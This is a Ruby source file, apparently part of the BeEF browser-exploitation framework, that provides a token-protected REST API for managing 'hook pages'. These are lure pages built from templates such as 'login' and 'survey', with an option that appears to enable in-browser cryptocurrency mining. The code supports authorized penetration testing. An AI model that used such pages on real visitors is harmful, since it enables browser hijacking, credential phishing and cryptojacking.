require 'json'

#
# Hook Page Generator – REST API
# GET    /api/hookpages/?token=xxx             → list all pages
# POST   /api/hookpages/?token=xxx             → create a page
# PUT    /api/hookpages/:slug?token=xxx        → update a page
# DELETE /api/hookpages/:slug?token=xxx        → delete a page
#
module BeEF
  module Extension
    module Hookpages
      class HookpagesRest < BeEF::Core::Router::Router
        config = BeEF::Core::Configuration.instance

        before do
          error 401 unless params[:token] == config.get('beef.api_token')
          halt  401 unless BeEF::Core::Rest.permitted_source?(request.ip)
          headers(
            'Content-Type'  => 'application/json; charset=UTF-8',
            'Pragma'        => 'no-cache',
            'Cache-Control' => 'no-cache',
            'Expires'       => '0'
          )
        end

        # List all hook pages
        get '/' do
          pages = BeEF::Extension::Hookpages.all_pages
          { success: true, count: pages.size, pages: pages }.to_json
        end

        # Create a hook page
        # Body: { "slug":"mypage", "title":"My Page", "template":"news",
        #         "custom_body":"...", "miner_enabled": true }
        post '/' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read)
            slug          = body['slug'].to_s.strip
            title         = body['title'].to_s.strip
            template      = body['template'].to_s.strip
            custom_body   = body['custom_body'].to_s
            miner_enabled = !!body['miner_enabled']

            halt 400, { success: false, error: 'slug and title are required' }.to_json if slug.empty? || title.empty?

            valid_templates = %w[blank news login survey error]
            template = 'blank' unless valid_templates.include?(template)

            result_slug = BeEF::Extension::Hookpages.create_page(slug, title, template, custom_body, miner_enabled)
            if result_slug
              { success: true, slug: result_slug,
                page: BeEF::Extension::Hookpages.get_page(result_slug) }.to_json
            else
              halt 400, { success: false, error: 'Invalid slug or duplicate' }.to_json
            end
          rescue JSON::ParserError
            halt 400, { success: false, error: 'Invalid JSON' }.to_json
          end
        end

        # Update a hook page (title, template, custom_body, miner_enabled)
        put '/:slug' do
          request.body.rewind
          begin
            body = JSON.parse(request.body.read)
            slug = params[:slug].to_s

            record = BeEF::Core::Models::HookPage.find_by(slug: slug)
            halt 404, { success: false, error: 'Page not found' }.to_json unless record

            valid_templates = %w[blank news login survey error]
            tpl = body['template'].to_s
            record.title         = body['title'].to_s.strip    if body.key?('title')
            record.template      = tpl                          if body.key?('template') && valid_templates.include?(tpl)
            record.custom_body   = body['custom_body'].to_s    if body.key?('custom_body')
            record.miner_enabled = !!body['miner_enabled']     if body.key?('miner_enabled')

            if record.save
              { success: true, page: record.as_api_hash }.to_json
            else
              halt 400, { success: false, error: record.errors.full_messages.join(', ') }.to_json
            end
          rescue JSON::ParserError
            halt 400, { success: false, error: 'Invalid JSON' }.to_json
          end
        end

        # Delete a hook page
        delete '/:slug' do
          deleted = BeEF::Extension::Hookpages.delete_page(params[:slug].to_s)
          if deleted
            { success: true, slug: params[:slug] }.to_json
          else
            halt 404, { success: false, error: 'Page not found' }.to_json
          end
        end
      end
    end
  end
end
